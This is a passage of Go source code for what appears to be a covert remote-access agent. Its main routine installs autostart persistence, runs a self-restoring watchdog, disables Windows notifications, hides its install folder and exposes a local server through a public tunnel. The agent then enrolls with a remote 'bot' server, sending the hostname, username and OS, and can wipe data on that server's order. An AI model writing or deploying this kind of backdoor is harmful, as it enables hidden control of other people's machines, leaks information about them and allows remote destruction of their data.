	case u := <-ch:
		if u == "" {
			return "", fmt.Errorf("tunnel non prêt")
		}
		return u, nil
	case <-time.After(90 * time.Second):
		return "", fmt.Errorf("tunnel non prêt")
	}
}

func httpPostJSON(url string, payload any) (map[string]any, error) {
	raw, _ := json.Marshal(payload)
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(raw))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 45 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	var data map[string]any
	if err := json.Unmarshal(b, &data); err != nil {
		return nil, err
	}
	return data, nil
}

func platformName() string {
	if runtime.GOOS == "windows" {
		return "windows"
	}
	if runtime.GOOS == "darwin" {
		return "mac"
	}
	return "linux"
}

func reportWiped(tok string) error {
	data, err := httpPostJSON(botBase+"/agent?action=wiped", map[string]string{"token": tok})
	if err != nil {
		return err
	}
	if ok, _ := data["ok"].(bool); !ok {
		return fmt.Errorf("wiped ack failed")
	}
	return nil
}

func wipeOrdered() bool {
	if token == "" || botBase == "" {
		return false
	}
	data, err := httpPostJSON(botBase+"/agent?action=wipe-check", map[string]string{"token": token})
	if err != nil {
		return false
	}
	ok, _ := data["ok"].(bool)
	wipe, _ := data["wipe"].(bool)
	return ok && wipe
}

func enroll(public string) (string, error) {
	var last error
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	for attempt := 1; attempt <= 30; attempt++ {
		data, err := httpPostJSON(botBase+"/agent?action=enroll&enroll="+enrollKey, map[string]string{
			"hostname":     hostname(),
			"callback_url": public,
			"user":         user,
			"os":           runtime.GOOS,
			"platform":     platformName(),
		})
		if err != nil {
			last = err
			logf(fmt.Sprintf("enroll retry %d", attempt))
			time.Sleep(time.Duration(min(2*attempt, 20)) * time.Second)
			continue
		}
		if ok, _ := data["ok"].(bool); !ok {
			last = fmt.Errorf("%v", data["error"])
			logf(fmt.Sprintf("enroll retry %d", attempt))
			time.Sleep(time.Duration(min(2*attempt, 20)) * time.Second)
			continue
		}
		tok, _ := data["token"].(string)
		if tok != "" {
			token = tok
		}
		if wipe, _ := data["wipe"].(bool); wipe {
			logf("wipe ordered on enroll")
			wipeAll()
		}
		return tok, nil
	}
	return "", last
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func tunnelPublicOK() bool {
	if publicURL == "" || token == "" {
		return false
	}
	client := &http.Client{Timeout: 12 * time.Second}
	resp, err := client.Get(publicURL + "/health?token=" + token)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	var data map[string]any
	_ = json.NewDecoder(resp.Body).Decode(&data)
	ok, _ := data["ok"].(bool)
	return ok
}

func acquireLock() {
	acquireSingleInstance()
}

func processExists(pid int) bool {
	if runtime.GOOS == "windows" {
		return processAliveWindows(pid)
	}
	p, err := os.FindProcess(pid)
	if err != nil {
		return false
	}
	return p.Signal(syscall.Signal(0)) == nil
}

func publish(port int, first bool, autostartInfo string) error {
	ensureHelperPresent()
	if _, err := ensureEdgeRelay(); err != nil {
		return err
	}
	for i := 0; i < 60; i++ {
		if networkOK() {
			break
		}
		time.Sleep(2 * time.Second)
	}
	u, err := startTunnel(port)
	if err != nil {
		return err
	}
	publicURL = u
	tok, err := enroll(publicURL)
	if err != nil {
		return err
	}
	token = tok
	st := loadState()
	st.Enroll = enrollKey
	st.BotBase = botBase
	st.Token = token
	st.PublicURL = publicURL
	saveState(st)
	logf("ready")
	if first {
		fmt.Println("OK")
		fmt.Printf("agent=%s\n", hostname())
		fmt.Printf("autostart=%s\n", autostartInfo)
		fmt.Println("reboot=auto")
		fmt.Println("watchdog=on")
		fmt.Printf("proc_agent=%s\n", helperFileName())
		fmt.Printf("proc_tunnel=%s\n", edgeFileName())
		fmt.Printf("deps=none\n")
	}
	return nil
}

func superviseUntilBreak() {
	ticks := 0
	fail := 0
	for !stopFlag {
		time.Sleep(5 * time.Second)
		ticks++
		ensureHelperPresent()
		_, _ = ensureEdgeRelay()
		if ticks%3 == 0 && wipeOrdered() {
			logf("wipe ordered while running")
			wipeAll()
		}
		cfMu.Lock()
		alive := cfProc != nil && cfProc.Process != nil
		cfMu.Unlock()
		if !alive {
			return
		}
		if !networkOK() {
			fail++
			if fail >= 2 {
				return
			}
			continue
		}
		fail = 0
		if ticks%6 == 0 && !tunnelPublicOK() {
			return
		}
	}
}

func main() {
	initPaths()
	if wantsWatchdogMode() {
		// Watchdog does not need full config to restore binaries; best-effort load.
		_ = loadConfig()
		runWatchdog()
		return
	}
	if err := loadConfig(); err != nil {
		fmt.Fprintf(os.Stderr, "FAIL: %v\n", err)
		os.Exit(1)
	}
	acquireLock()
	ensureHelperPresent()
	info := installAutostart()
	ensureWatchdogRunning()
	disableWindowsNotifications()
	hideInstallTree()
	port, err := findFreePort()
	if err != nil {
		fmt.Fprintf(os.Stderr, "FAIL: %v\n", err)
		os.Exit(1)
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/", handle)
	srv := &http.Server{Addr: fmt.Sprintf("127.0.0.1:%d", port), Handler: mux}
	go func() { _ = srv.ListenAndServe() }()

	first := true
	for !stopFlag {
		if err := publish(port, first, info); err != nil {
			logf("err " + err.Error())
			time.Sleep(5 * time.Second)
			continue
		}
		first = false
		superviseUntilBreak()
		killTunnelOnly()
		time.Sleep(2 * time.Second)
	}
	_ = srv.Shutdown(context.Background())
}
